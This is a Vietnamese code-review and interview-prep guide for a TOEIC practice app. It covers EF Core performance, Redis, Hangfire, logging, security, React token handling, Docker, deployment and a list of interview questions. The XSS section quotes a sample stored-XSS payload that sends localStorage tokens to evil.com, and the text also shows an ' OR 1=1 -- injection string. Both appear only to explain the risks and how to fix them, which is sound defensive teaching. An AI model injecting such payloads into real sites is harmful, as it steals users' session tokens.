**Keyword: `AsNoTracking()`** — tắt theo dõi cho query **chỉ đọc**. Bỏ snapshot → giảm ~2-3 lần RAM và CPU.

> ⚠️ **Grep toàn solution: 0 kết quả cho `AsNoTracking`.** Mọi query đều tracking.
>
> Tác động cụ thể: `Question` có `Content(2000)` + `Passage(5000)` + `Explanation(3000)` +
> `AiExplanation(5000)` ký tự. Query `GetPlay` nạp 200 `Question` + 800 `QuestionOption` để render đề —
> change tracker **nhân đôi** lượng RAM đó mà không bao giờ dùng tới.
>
> **Cách sửa gọn nhất:** đặt mặc định NoTracking ở `Program.cs` rồi bật tracking có chủ đích cho luồng ghi:
> ```csharp
> options.UseSqlServer(...).UseQueryTrackingBehavior(QueryTrackingBehavior.NoTracking);
> ```

## 6.2 · N+1 — và cách phân biệt N+1 thật với N+1 giả ✅

**Keyword: N+1.** Query 1 lần lấy N dòng, rồi lặp qua từng dòng query tiếp → N+1 query.

> 🎯 **Chi tiết ăn điểm:** **không phải mọi `await` trong `foreach` đều là N+1.**
> - `DbSet.AddAsync()` **KHÔNG** đi xuống DB — chỉ ghi vào change tracker (nó async chỉ vì value generator)
> - `SaveChangesAsync()` thì **CÓ**
>
> Trong dự án:
> - **N+1 giả** — `TestSessionService.cs:114`, `TestService.cs:428`: `AddAsync` trong `foreach`, một lần `SaveChanges` cuối. **Không sao.**
> - **N+1 thật** — `QuestionService.cs:272-274`: `SaveChangesAsync` **bên trong** vòng lặp đọc từng dòng Excel. Import 200 câu = 200 round-trip, 200 transaction, và **import dở dang không rollback được**.

**Cách dự án tránh N+1 kinh điển:** vì Repository không có `Include()`, code dùng
**"query theo lô + ghép bằng Dictionary"** (`TestSessionService.cs:330-331`):
```csharp
var qIds = tqs.Select(tq => tq.QuestionId).ToList();
var questions = await repo.FindAsync(q => qIds.Contains(q.Id));   // 1 query
var qDict = questions.ToDictionary(q => q.Id);                    // ghép trong RAM
```

> **Cách trình bày khi phỏng vấn:** đừng nhận là "chưa biết `Include()`". Nói:
> *"Repository của em không expose `IQueryable` nên không eager load được. Em dùng mẫu query theo lô rồi
> ghép bằng Dictionary — 2 query thay vì N+1. Cách này còn tránh được **cartesian explosion** khi JOIN
> nhiều bảng one-to-many, đổi lại phải viết tay nhiều hơn."*

## 6.3 · `Contains(list)` → OPENJSON trong EF Core 8 ✅

> 🔴 **Đính chính bản trước:** phiên bản cũ viết `sessionIds.Contains(...)` sinh
> `IN (@p0,@p1,...)` và **sẽ lỗi khi vượt 2.100 tham số**. **Sai.**
>
> Từ EF Core 8, provider SQL Server dịch `list.Contains(x)` (list là captured variable) thành
> **`OPENJSON(@list)`** — toàn bộ list đi xuống DB dưới dạng **một tham số JSON duy nhất**.
> Dự án dùng EF Core 8.0.11 và không đặt `UseCompatibilityLevel` → **không dính giới hạn 2.100**.

**Tin xấu thật sự (khác với điều tôi tưởng):** `OPENJSON` **không có thống kê (statistics)**.
SQL Server đoán bừa số dòng (thường 50) → chọn nhầm loop join, nhầm index khi list lớn.
Dự án có **13 chỗ** dùng mẫu này.

**Cách xử lý:** (a) chuyển sang JOIN thật thay vì `Contains`; (b) EF 9 có
`TranslateParameterizedCollectionsToConstants`; (c) thêm `OPTION(RECOMPILE)` qua raw SQL cho query thống kê.

## 6.4 · `CancellationToken` ⚠️ có chữ ký nhưng không bao giờ truyền

**Keyword: `CancellationToken`** — cho phép hủy query khi client ngắt kết nối, trả lại connection pool
và luồng CPU của SQL Server.

> ⚠️ `IRepository.cs:17` có tham số `ct = default`, nhưng grep toàn bộ Controllers + Services:
> **không action nào nhận `CancellationToken`, không lời gọi nào truyền nó.**
>
> **Hệ quả cụ thể:** endpoint nặng nhất chạy hàng giây; user đóng tab hay F5 liên tục thì query cũ vẫn
> chạy tới cùng, chiếm connection pool (mặc định 100 connection) → **đường ngắn nhất tới pool exhaustion**.
>
> Chi phí sửa gần bằng 0: thêm `CancellationToken ct` vào action, truyền xuyên xuống repository.

## 6.5 · Async/await ✅

**Keyword: Thread Pool Starvation.** Server có số luồng giới hạn. Nếu mỗi request chiếm một luồng rồi
**đứng chờ** DB, chỉ vài trăm request đồng thời là hết luồng — server đứng hình dù CPU rảnh.

`async/await` giải quyết: khi `await` I/O, luồng được **trả về pool**. Khi DB trả kết quả, một luồng
bất kỳ tiếp tục công việc dở dang.

**Bẫy — deadlock:**
```csharp
var r = SomeAsyncMethod().Result;                      // ❌
var r = SomeAsyncMethod().GetAwaiter().GetResult();    // ❌
var r = await SomeAsyncMethod();                       // ✅
```
Dự án dùng `async/await` xuyên suốt — làm đúng.

## 6.6 · Kết nối DB ⚠️ chưa có retry

`Program.cs:35-36` đăng ký `UseSqlServer(connectionString)` trần — **không có**
`EnableRetryOnFailure()`. Trên VPS/cloud, kết nối DB rớt tạm thời là chuyện thường
(**transient fault**). Không có retry thì một lần rớt mạng = request lỗi 500.

```csharp
options.UseSqlServer(cs, sql => sql.EnableRetryOnFailure(
    maxRetryCount: 3, maxRetryDelay: TimeSpan.FromSeconds(5), errorNumbersToAdd: null));
```

---

# 7. Redis

## ⚠️ Sự thật: đã dựng dây, chưa dùng — nhưng lại là dependency bắt buộc

**Đây là điều quan trọng nhất phần này.** Nếu phỏng vấn hỏi "dự án em dùng Redis à?" mà trả lời
"vâng, để cache" thì câu tiếp theo — *"cache cái gì?"* — sẽ không có câu trả lời.

**Kiểm chứng được:**
- `Program.cs:66-67` có đăng ký `IConnectionMultiplexer` (Singleton) và `ICacheService` (Scoped)
- `RedisCacheService.cs` implement đầy đủ Get/Set/Remove/Exists
- **Nhưng `ICacheService` không được inject vào bất kỳ service nào.** Grep toàn solution chỉ ra 2 chỗ:
  dòng đăng ký DI và chính class implement.

**Nghịch lý nguy hiểm:** hạ tầng là code chết, **nhưng lại là dependency BẮT BUỘC lúc khởi động**
vì `ConnectionMultiplexer.Connect()` chạy **đồng bộ, eager** ngay lúc build DI container.
→ **Redis sập thì API không start được, dù API không dùng Redis để làm gì.**

> **Cách nói đúng khi phỏng vấn:**
> > *"Em đã dựng sẵn hạ tầng Redis — `ICacheService` với `RedisCacheService`, đăng ký DI xong. Nhưng
> > chưa có tính năng nào thật sự cache, vì phần đáng cache nhất là giải thích đáp án bằng AI thì em
> > chưa làm tới. Em không muốn cache bừa khi chưa đo được cái gì chậm. Em cũng phát hiện chỗ này đang
> > connect đồng bộ lúc khởi động nên Redis chết là API không start được — đó là lỗi em cần sửa trước khi deploy."*
>
> Trả lời vậy vừa trung thực, vừa cho thấy tư duy đúng (không tối ưu sớm), vừa chứng minh có rà soát code.

## 7.1 · Code đã có ✅

[RedisCacheService.cs](../backend/ToeicMasterPro.Infrastructure/Caching/RedisCacheService.cs):
```csharp
public RedisCacheService(IConnectionMultiplexer redis) => _db = redis.GetDatabase();

public async Task<T?> GetAsync<T>(string key, CancellationToken ct = default)
{
    var value = await _db.StringGetAsync(key);
    return value.IsNullOrEmpty ? default : JsonSerializer.Deserialize<T>(value!);
}
```

| Keyword | Nghĩa |
|---|---|
| `IConnectionMultiplexer` | Quản lý pool kết nối. **Nặng** → Singleton |
| `IDatabase` | Handle nhẹ, lấy từ multiplexer |
| `StringGetAsync/SetAsync` | Redis chỉ lưu string/binary → object phải serialize JSON |
| `expiry` (TTL) | `null` = không hết hạn (**nguy hiểm**, dễ đầy RAM) |

**Cấu hình Docker:** `--appendonly yes` (**AOF** — ghi lệnh ra file, restart không mất dữ liệu),
`--maxmemory 256mb`, `--maxmemory-policy allkeys-lru` (**LRU** — đầy thì xóa key lâu không dùng nhất).

**Vì sao `allkeys-lru` đúng cho cache?** Mất dữ liệu cache không sao — query lại DB. Nếu dùng Redis làm
**nguồn dữ liệu chính** (session store) thì phải chọn `noeviction`.

## 7.2 · ⬜ Kế hoạch dùng — mục đích từng cái

| Cache gì | Key | TTL | Vì sao đáng |
|---|---|---|---|
| **Giải thích đáp án AI** | `ai:explain:{questionId}` | 7 ngày | **Đáng nhất.** Mỗi lần gọi Claude tốn tiền + 2–5 giây. Cùng câu hỏi thì giải thích y hệt |
| Cấu trúc đề | `test:structure:{testId}` | 1 giờ | Đọc rất nhiều, gần như không đổi |
| Leaderboard | `leaderboard:weekly` | — | Redis **Sorted Set**: `ZADD` / `ZREVRANGE 0 9` — O(log N) |
| Dashboard stats | `stats:{userId}` | 5 phút | Query nặng nhất hệ thống, chỉ đổi khi nộp bài mới |

**Keyword: Cache Invalidation** — bài toán khó nhất của caching.

| Chiến lược | Cách làm | Hợp với |
|---|---|---|
| **TTL** | Đặt hạn, hết tự xóa | Chấp nhận cũ vài phút |
| **Write-through** | Ghi DB xong xóa/cập nhật cache | Phải luôn đúng |
| **Cache-aside** | Đọc cache trước, trượt thì query DB rồi nạp | Mặc định |

**Keyword: Cache Stampede.** Key nóng hết hạn → hàng trăm request cùng trượt cache, cùng lao vào DB →
DB sập. Chống bằng khóa phân tán hoặc làm mới cache trước khi hết hạn.

---

# 8. Hangfire

## ✅ Đang chạy thật — 1 job

**Vấn đề nó giải:** user bấm chuông đăng ký nhắc lịch thi. Mail phải gửi **3 ngày trước ngày thi** —
không thể bắt request chờ. Request chỉ ghi DB rồi trả về ngay; quét và gửi mail để Hangfire làm.

```
[User bấm chuông]  → INSERT UserExamReminders (EmailSent=false) → trả 200 ngay
[Hangfire 00:30]   → tìm EmailSent=false AND ExamDate = hôm nay+3 → gửi mail → EmailSent=true
```

**Cấu hình** ([Program.cs:76-91](../backend/ToeicMasterPro.API/Program.cs#L76)):
`UseSqlServerStorage(...)` với `PrepareSchemaIfNecessary = true` (tự tạo bảng `HangFire.*`),
`AddHangfireServer()` bật **worker**.

> **Keyword: `AddHangfireServer()`** — thiếu dòng này thì job vẫn được lưu DB nhưng **không bao giờ chạy**.
> Lỗi hay gặp.

**Cron** ([Program.cs:223-226](../backend/ToeicMasterPro.API/Program.cs#L223)): `"30 0 * * *"` —
5 phần `phút giờ ngày tháng thứ`.

> ⚠️ **Bẫy múi giờ:** Hangfire mặc định hiểu cron theo **UTC**. Comment trong code ghi "00:30 mỗi ngày"
> nhưng thực tế job chạy **07:30 giờ Việt Nam**. Muốn đúng phải truyền
> `TimeZoneInfo` vào `RecurringJobOptions`.

**Keyword: at-least-once delivery.** Hangfire đảm bảo job chạy **ít nhất một lần**, không đảm bảo
**đúng một lần**. Worker chết giữa chừng thì job chạy lại → job phải **idempotent**. Dự án làm đúng
nhờ cột `EmailSent`.

> ⚠️ Nhưng `ExamReminderService.cs:41-67` **gửi mail TRƯỚC khi commit** `EmailSent = true`. Nếu
> `SaveChanges` lỗi sau khi mail đã gửi thì lần chạy sau **gửi trùng**.

**Vì sao Hangfire mà không dùng `BackgroundService` của .NET?** `BackgroundService` là vòng lặp
`while(true)` trong process — **mất trạng thái khi restart**, không có retry, không có dashboard,
không chạy được nhiều worker. Hangfire lưu job vào SQL nên restart vẫn nhớ, có retry tự động, có UI.

> 🔴 **Lỗ hổng:** `app.UseHangfireDashboard("/hangfire")` ([Program.cs:221](../backend/ToeicMasterPro.API/Program.cs#L221))
> nằm **ngoài** khối `IsDevelopment` và **không có** `DashboardOptions.Authorization`.
> Deploy lên là ai vào `domain.com/hangfire` cũng xem và bấm "Trigger now" được.

---

# 9. Logging & xử lý lỗi

## 9.1 · Serilog ✅

**Keyword: Structured Logging** — ghi kèm **trường có tên**, tìm kiếm được:
```csharp
_logger.LogError("Loi cham bai {UserId} phien {SessionId}", userId, sessionId);  // ✅
_logger.LogError("Loi cham bai user " + userId);                                 // ❌ chỉ là chuỗi
```

`Program.cs:31-32` đọc toàn bộ cấu hình từ `appsettings.json` → đổi mức log không cần build lại.

**Keyword: Sink** — nơi log chảy tới. Dự án: Console (dev) + File (xoay theo ngày, giữ 7 ngày).
`UseSerilogRequestLogging()` ghi mỗi HTTP request thành **một dòng** gồm method, path, status, thời gian.

## 9.2 · Global Exception Handler ✅

[GlobalExceptionHandler.cs](../backend/ToeicMasterPro.API/Middleware/GlobalExceptionHandler.cs):
```csharp
public async ValueTask<bool> TryHandleAsync(HttpContext ctx, Exception ex, CancellationToken ct)
{
    _logger.LogError(ex, "Exception occurred: {Message}", ex.Message);
    var problem = new ProblemDetails {
        Status = 500, Title = "Internal Server Error",
        Detail = "An unexpected error. Please try again later."   // ← không lộ chi tiết
    };
    ...
    return true;   // đã xử lý, đừng để lọt ra
}
```

| Keyword | Nghĩa |
|---|---|
| `IExceptionHandler` | Interface mới .NET 8, gọn hơn middleware thủ công |
| `ProblemDetails` | Chuẩn **RFC 7807** — JSON lỗi thống nhất |

**Điểm làm đúng:** `Detail` trả câu chung chung, **không** trả `ex.Message` hay stack trace. Lộ stack
trace là rò rỉ thông tin: kẻ tấn công biết cấu trúc thư mục, phiên bản thư viện, tên bảng DB.

> ⚠️ Nhưng có **2 chỗ đi vòng qua handler này** và trả thẳng `ex.Message` ra client:
> `TestController.cs:236-239` và `AuthService.cs:175` (lỗi verify token Google).

---

# 10. Bảo mật

## 10.1 · Thứ tự middleware ✅

| Vị trí | Vì sao phải ở đó |
|---|---|
| `UseExceptionHandler` **đầu tiên** | Bọc ngoài cùng mới bắt được exception từ **mọi** lớp trong |
| `UseCors` **trước** `UseAuthentication` | Preflight `OPTIONS` **không kèm** `Authorization`. Auth chạy trước → preflight 401 → trình duyệt kết luận CORS thất bại → request thật không bao giờ gửi |
| `UseAuthentication` **trước** `UseAuthorization` | Phải biết "anh là ai" rồi mới xét "anh được làm gì". Sai thứ tự → `HttpContext.User` luôn rỗng → mọi request 401 |

> ⚠️ **Một chỗ đặt sai:** `UseStaticFiles()` (Program.cs:215) đứng **trước** `UseAuthentication()`
> → **toàn bộ audio/ảnh đề thi và avatar user là public, không cần token**. Đoán được đường dẫn là tải
> được file. Với đề thi có bản quyền thì đây là vấn đề thật.

## 10.2 · CORS ✅

**Keyword: Same-Origin Policy** — quy tắc của **trình duyệt**: JS trên `http://localhost:5173` mặc định
không được gọi `https://localhost:7021` (khác port = khác origin).

**Keyword: Preflight** — với request "không đơn giản" (có `Authorization`, hoặc `PUT`/`PATCH`/`DELETE`),
trình duyệt tự gửi `OPTIONS` trước để hỏi server.

⚠️ `AllowCredentials()` **không** dùng chung được với `AllowAnyOrigin()`. Dự án làm đúng — đọc danh
sách origin cụ thể từ config.

> **Hiểu lầm rất phổ biến — đáng ghi nhớ:** CORS **không phải cơ chế bảo mật cho server**. Nó bảo vệ
> **người dùng trình duyệt**. Postman, curl, script **không hề bị CORS chặn**. Bảo mật server luôn nằm
> ở authentication + authorization.

## 10.3 · Rate Limiting ⚠️

[Program.cs:144-165](../backend/ToeicMasterPro.API/Program.cs#L144): policy `"auth"` —
5 request/phút/IP, `QueueLimit = 0` (hết quota từ chối ngay).

| Keyword | Nghĩa |
|---|---|
| **Fixed Window** | Chia thời gian thành ô cố định. Đơn giản, nhưng gửi 5 req lúc 00:59 + 5 req lúc 01:00 = **10 req trong 2 giây** vẫn hợp lệ |
| **Sliding Window** | Cửa sổ trượt theo thời gian thực — chính xác hơn |
| **Token Bucket** | Xô token hồi dần — cho phép burst ngắn |
| `partitionKey` | Đếm riêng cho từng ai — ở đây là từng IP |

> ⚠️ **Ba vấn đề:**
> 1. Policy áp cho **toàn bộ** `AuthController` → bóp nghẹt cả `refresh-token` và `logout`, không chỉ login
> 2. Chỉ có **một** policy, mọi endpoint khác **không giới hạn** — kể cả `GET /api/Question` đang lộ đáp án
> 3. Phân vùng theo `RemoteIpAddress` mà **chưa cấu hình `UseForwardedHeaders`** → khi có Nginx đứng
>    trước, mọi request mang IP của Nginx → rate limit **sai hoàn toàn**
>
> Ngoài ra rate limiter này là **in-memory**, không dùng Redis → chạy nhiều instance thì mỗi instance
> đếm riêng, giới hạn thực tế nhân lên theo số instance.

## 10.4 · Những lỗ hổng framework đã che ✅

| Lỗ hổng | Vì sao không dính | Cẩn thận khi |
|---|---|---|
| **SQL Injection** | EF Core dùng **parameterized query**. Grep toàn backend: **0 kết quả** `FromSqlRaw`/`ExecuteSqlRaw` | Dùng raw SQL nối chuỗi |
| **CSRF** | JWT trong header `Authorization`, không phải cookie → trình duyệt không tự gửi kèm | Chuyển token sang cookie |
| **Path traversal** | `MediaController.cs:81-85` có sanitize tên file | — |

**Keyword: Parameterized Query.** EF sinh `WHERE Email = @p0` rồi gửi giá trị riêng. SQL Server hiểu
`@p0` là **dữ liệu**, không bao giờ là **lệnh** — user gõ `' OR 1=1 --` cũng chỉ là chuỗi vô hại.

## 10.5 · ⚠️ XSS — chưa được che

**Keyword: XSS (Cross-Site Scripting)** — chèn JS độc vào nội dung, chạy trong trình duyệt nạn nhân.

React **tự escape** mọi thứ render trong JSX → miễn nhiễm XSS mặc định. **Trừ khi** dùng
`dangerouslySetInnerHTML`.

> 🔴 Dự án có **15 chỗ** dùng `dangerouslySetInnerHTML` để render nội dung câu hỏi (vì CM soạn bằng
> TipTap nên nội dung là HTML). **Không sanitize ở cả frontend lẫn backend.**
>
> Kết hợp với **token lưu trong `localStorage`** → một CM (hoặc kẻ chiếm tài khoản CM) chèn
> `<img src=x onerror="fetch('evil.com?t='+localStorage.token)">` vào nội dung câu hỏi là **đánh cắp
> token của mọi user làm đề đó**.
>
> **Cách sửa:** sanitize HTML phía **backend** lúc lưu (thư viện `HtmlSanitizer`) — không chỉ ở frontend,
> vì frontend bỏ qua được.

**Keyword: Stored XSS vs Reflected XSS.** *Stored* = mã độc lưu vào DB, tấn công mọi người xem sau đó
(trường hợp này). *Reflected* = mã độc trong URL, chỉ tấn công người bấm link.

## 10.6 · Secrets ⚠️

**Ba tầng chuẩn:**

| Môi trường | Cách lưu |
|---|---|
| **Dev** | **User Secrets** — `dotnet user-secrets set "Jwt:SecretKey" "..."`. File nằm ở `%APPDATA%\Microsoft\UserSecrets\` — **ngoài thư mục project**, không thể vô tình commit |
| **Staging** | **Biến môi trường**. .NET tự đọc và ghi đè config. Dấu `__` thay cho `:` → `Jwt__SecretKey` |
| **Production** | **Secret manager** — Azure Key Vault, AWS Secrets Manager |

**Keyword: Configuration Provider chain.** ASP.NET Core nạp config theo thứ tự, cái sau **ghi đè** cái trước:
`appsettings.json` → `appsettings.{Environment}.json` → User Secrets (chỉ Dev) → **biến môi trường** →
command-line args. Nhờ vậy production chỉ cần set env var, không cần sửa file.

> 🔴 Hiện trạng dự án vi phạm nghiêm trọng điều này — xem [09 — Phần 1](09-hien-trang-va-khuyen-nghi.md).

---

# 11. Frontend

## 11.1 · Token lưu ở `localStorage` ⚠️

[token.ts:5-8](../frontend/src/lib/token.ts#L5) — access token và refresh token đều lưu `localStorage`.

| Nơi lưu | Ưu | Nhược |
|---|---|---|
| **localStorage** | Đơn giản, sống qua reload và đóng tab | **JS đọc được → XSS là mất token** |
| **Memory (biến JS)** | XSS khó lấy hơn | Mất khi F5 |
| **httpOnly cookie** | JS **không** đọc được → miễn nhiễm XSS | Phải chống CSRF, phức tạp hơn với SPA |

> **Cách trả lời:** *"Em lưu localStorage cho đơn giản. Em biết đánh đổi là dính XSS thì mất token —
> và dự án em đang có 15 chỗ `dangerouslySetInnerHTML` chưa sanitize nên rủi ro đó là thật. Cách chuẩn
> hơn là access token giữ trong memory, refresh token trong httpOnly cookie."*

## 11.2 · Axios interceptor ⚠️ — thiếu auto-refresh

[axios.ts:10-16](../frontend/src/api/axios.ts#L10) — request interceptor tự gắn
`Authorization: Bearer <token>` vào mọi request.

> 🔴 **Nhưng response interceptor gặp 401 thì xóa token và đá về `/login` — KHÔNG hề gọi refresh token.**
>
> Backend **có** endpoint `/api/auth/refresh`, frontend **có** lưu refresh token, nhưng **chưa bao giờ
> dùng đến**.
>
> **Hệ quả thật, đúng với sản phẩm này:** access token 60 phút, bài thi TOEIC dài **2 tiếng**.
> → User đang thi đến phút thứ 61, bấm chọn đáp án → 401 → **văng thẳng về trang login, mất toàn bộ bài làm.**
>
> Đây không phải lỗi lý thuyết — nó **chắc chắn xảy ra** với mọi user thi full test.

**Keyword: Refresh token race.** Khi implement auto-refresh phải chống trường hợp nhiều request cùng
401 một lúc → cùng gọi refresh → token rotation làm các request sau thất bại. Chuẩn: một promise refresh
dùng chung, các request khác **xếp hàng chờ** rồi retry.

## 11.3 · Zustand + persist ✅

**Keyword: Selector-based subscription** — `useAuthStore(state => state.user)` chỉ re-render component
khi **đúng field đó** đổi. React Context thì re-render **toàn bộ cây** con.

**Keyword: `persist` middleware** — tự sync state vào localStorage, refresh trang không mất trạng thái login.
`partialize` chỉ lưu `user` + `isAuthenticated`, không lưu hàm.

## 11.4 · Kỹ thuật React đáng nói trong màn thi ✅

| Kỹ thuật | Ở đâu | Giải quyết gì |
|---|---|---|
| **Debounce + flush** | `MockTestPlayPage.tsx:536-545` | Gộp nhiều lần chọn đáp án thành một request; **flush** trước khi nộp để không mất đáp án cuối |
| **`useRef` chống stale closure** | `MockTestPlayPage.tsx:117-118` | Callback trong `setInterval` "nhớ" giá trị state cũ. `useRef` luôn trỏ tới giá trị mới nhất |
| **Guard chống submit lặp** | `MockTestPlayPage.tsx:599-604` | Timer hết giờ + user bấm nút cùng lúc → chặn bằng ref đồng bộ |
| **`beforeunload`** | `MockTestPlayPage.tsx:608-615` | Cảnh báo khi rời trang giữa bài thi |

> ⚠️ Nhưng **F5 giữa bài thi tạo phiên MỚI** — đồng hồ reset 75:00, đáp án biến khỏi màn hình.
> Có `beforeunload` cảnh báo nhưng nếu user vẫn F5 thì mất. Cách sửa: lưu `sessionId` vào
> `sessionStorage` và khôi phục phiên đang dở.

---

# 12. Docker

## 12.1 · ✅ Đã có — chỉ hạ tầng dev

`docker-compose.yml` chạy 2 dịch vụ: SQL Server + Redis. API và frontend vẫn chạy trực tiếp trên máy.

| Keyword | Nghĩa |
|---|---|
| **Image** | Bản đóng gói bất biến — như file cài đặt |
| **Container** | Tiến trình đang chạy từ image — như chương trình đã cài |
| **Volume** | Vùng lưu trữ độc lập với container → xóa container không mất dữ liệu |
| **Healthcheck** | Lệnh kiểm tra định kỳ xem dịch vụ sẵn sàng chưa |
| `${VAR:-fallback}` | Lấy biến môi trường, không có thì dùng giá trị mặc định |

**Vì sao SQL Server cần `start_period: 30s`?** Nó khởi động chậm ~30 giây. Không có tham số này,
healthcheck chạy từ giây đầu sẽ báo unhealthy sai.

## 12.2 · ⬜ Chưa có — Dockerfile cho app

**Keyword: Multi-stage build** — kỹ thuật quan trọng nhất khi đóng gói .NET. Dùng image SDK (~800MB,
có compiler) để **build**, rồi chỉ copy kết quả sang image runtime (~200MB). Image cuối **nhỏ hơn 4 lần**
và **không chứa mã nguồn**.

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY *.sln .
COPY backend/*/*.csproj ./          # ← copy csproj TRƯỚC
RUN dotnet restore                   # ← layer này được cache
COPY . .                             # ← code copy sau
RUN dotnet publish -c Release -o /app/publish

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app/publish .
ENTRYPOINT ["dotnet", "ToeicMasterPro.API.dll"]
```

**Keyword: Layer caching.** Docker cache từng lệnh. Copy `.csproj` và `restore` **trước** khi copy toàn
bộ mã nguồn → sửa code không phải tải lại toàn bộ NuGet package. Mẹo tăng tốc build rất đáng biết.

---

# 13. Deploy & CI/CD — khái niệm

> Phần này giải thích **khái niệm để trả lời phỏng vấn**.
> Hướng dẫn **làm thật từng bước** nằm ở [09 — Phần 4](09-hien-trang-va-khuyen-nghi.md).

## 13.1 · Nginx — Reverse Proxy

**Keyword: Reverse Proxy** — máy chủ đứng trước, nhận mọi request từ Internet rồi phân phối vào các
dịch vụ bên trong.

```
Internet :443 ──► Nginx ──┬──► /       → file tĩnh React
                          └──► /api/*  → Kestrel (API)
```

**Vì sao cần, không để Kestrel chạy thẳng?**

| Việc | Vì sao Nginx tốt hơn |
|---|---|
| Kết thúc SSL | Xử lý chứng chỉ một chỗ, API không cần biết gì về HTTPS |
| Phục vụ file tĩnh | Nhanh hơn Kestrel nhiều — quan trọng vì dự án có audio nặng |
| Nén gzip/brotli | Giảm băng thông |
| Rate limit lớp ngoài | Chặn trước khi chạm API |
| Load balancing | Sau này chạy nhiều instance |

**Keyword: `try_files $uri $uri/ /index.html`** — bắt buộc với **SPA**. React Router xử lý đường dẫn ở
trình duyệt; server không có file `/mock-test/history`. Dòng này bảo Nginx: không tìm thấy file thì trả
`index.html` để React tự route. **Thiếu nó → F5 ở trang bất kỳ ra 404.**

**Keyword: `X-Forwarded-For`** — header mang IP thật của client. Thiếu nó, API thấy mọi request đến từ
IP của Nginx → rate limit theo IP sai hoàn toàn. Phía .NET phải bật `UseForwardedHeaders`.

## 13.2 · SSL/TLS

**Keyword: SSL/TLS** — mã hóa dữ liệu giữa trình duyệt và server. Không có nó, mật khẩu và JWT truyền
plaintext, ai bắt gói tin cũng đọc được.

**Keyword: Let's Encrypt** — cấp chứng chỉ miễn phí, tự động. Hạn **90 ngày** nên bắt buộc tự động gia hạn.
**Keyword: Certbot** — công cụ xin và gia hạn.

**Keyword: HSTS** — header bảo trình duyệt "từ giờ **luôn** dùng HTTPS với tên miền này", chống tấn công
hạ cấp giao thức.

## 13.3 · DNS

**Keyword: DNS** — dịch tên miền thành IP.

| Loại bản ghi | Nghĩa |
|---|---|
| **A** | Tên miền → IPv4 |
| **AAAA** | Tên miền → IPv6 |
| **CNAME** | Tên miền → tên miền khác |
| **TXT** | Chuỗi tự do — xác minh quyền sở hữu |

**Keyword: TTL** — thời gian máy chủ DNS khác được nhớ kết quả. Đặt thấp (300s) khi sắp đổi IP.
**Keyword: Propagation** — thời gian bản ghi mới lan toàn cầu, vài phút tới vài giờ.

## 13.4 · CI/CD

**Keyword: CI (Continuous Integration)** — mỗi lần push, tự động build và chạy test. Phát hiện hỏng ngay
thay vì để dồn.
**Keyword: CD (Continuous Deployment)** — build xong tự deploy.

> ⬜ `.github/workflows/` hiện **rỗng hoàn toàn** → 30 test trong repo **không bao giờ được chạy tự động**.

**Keyword: Secrets trong GitHub Actions** — lưu ở `Settings → Secrets and variables → Actions`, dùng
`${{ secrets.TEN }}`. **Không bao giờ** ghi thẳng vào file workflow.

---

# 14. Ngân hàng câu hỏi phỏng vấn

> **Cách dùng đúng:** tự trả lời **bằng lời của mình**, ghi âm lại hoặc viết ra. Trả lời xong mới mở
> tài liệu đối chiếu. Chỗ nào nói không trôi chính là chỗ chưa hiểu — **đọc lại không giải quyết được,
> phải nói lại lần nữa.**

## Kiến trúc
1. Vẽ 4 tầng của dự án, mũi tên phụ thuộc chỉ hướng nào, vì sao?
2. Business logic nằm ở tầng nào? Có đúng chuẩn Clean Architecture không?
3. `DbContext` đã là Unit of Work, sao còn bọc `Repository<T>`? Được gì, mất gì?
4. Vì sao trả `Result<T>` thay vì ném exception?
5. Anemic Domain Model là gì? Domain của em thuộc loại nào?
6. Ba lifetime của DI khác nhau chỗ nào? Captive dependency là gì?

## Authentication
7. Kể luồng đăng nhập từ lúc bấm nút đến khi vào `/dashboard`.
8. JWT gồm mấy phần? Payload có mã hóa không?
9. Mật khẩu lưu thế nào? Salt để làm gì? PBKDF2 có điểm yếu gì?
10. Vì sao cần refresh token? Nó khác access token chỗ nào?
11. Token rotation là gì? Reuse detection là gì và dự án em có chưa?
12. `ClockSkew = TimeSpan.Zero` để làm gì? Mặc định bao nhiêu?
13. `MapInboundClaims = false` giải quyết vấn đề gì?
14. Google login vì sao phải kiểm claim `aud`? Không kiểm thì bị gì?
15. **Access token hết hạn giữa lúc user đang thi thì chuyện gì xảy ra?** *(dự án em hiện đang hỏng ở đây — nói thật)*

## Authorization
16. Phân biệt `UseAuthentication` và `UseAuthorization`. Đổi thứ tự thì sao?
17. IDOR/BOLA là gì? Dự án chặn bằng cách nào?
18. Fallback authorization policy là gì? Vì sao "secure by default" quan trọng?

## Database
19. N+1 là gì? `AddAsync` trong `foreach` có phải N+1 không?
20. `AsNoTracking()` là gì, khi nào dùng? Dự án em dùng chưa?
21. Migration chạy trên production thế nào cho an toàn?
22. Composite index — thứ tự cột có quan trọng không? Vì sao?
23. Sargable là gì? `.ToLower()` trong `WHERE` gây vấn đề gì?
24. Value Converter là gì? Vì sao phải kèm `ValueComparer`?
25. Cascade vs Restrict delete — dự án chọn cái nào cho `Question`, vì sao?

## Redis & Hangfire
26. **Dự án em dùng Redis để làm gì?** *(phải trả lời trung thực — xem Phần 7)*
27. Cache invalidation có mấy chiến lược? Cache stampede là gì?
28. Vì sao dùng Hangfire mà không dùng `BackgroundService`?
29. Job chạy hai lần thì sao? Idempotent nghĩa là gì?

## Bảo mật
30. CORS có bảo vệ được server không?
31. Em quản lý secret ra sao? *(3 tầng: User Secrets → env var → Key Vault)*
32. Vì sao EF Core miễn nhiễm SQL injection?
33. XSS là gì? React có tự chống không? `dangerouslySetInnerHTML` phá vỡ điều đó thế nào?
34. Token lưu localStorage có rủi ro gì? Cách nào an toàn hơn?
35. Rate limiting: Fixed Window có nhược điểm gì?

## Deploy
36. Multi-stage build là gì, lợi ích? Layer caching hoạt động ra sao?
37. Nginx đứng trước API để làm gì?
38. SPA thiếu `try_files ... /index.html` thì lỗi gì?
39. Không có `X-Forwarded-For` thì rate limit sai thế nào?
40. Có CI chưa? Nếu chưa thì workflow tối thiểu gồm gì?

## Câu khó nhất — và quan trọng nhất
41. **"Dự án em còn điểm gì chưa tốt?"**
    → Đây là câu ăn điểm lớn nhất. Xem [09 — bảng nợ kỹ thuật](09-hien-trang-va-khuyen-nghi.md).
    Nói được 3–4 điểm yếu thật kèm cách sửa và lý do chưa sửa = chứng minh bạn **hiểu** code chứ không
    chỉ **viết** ra nó.
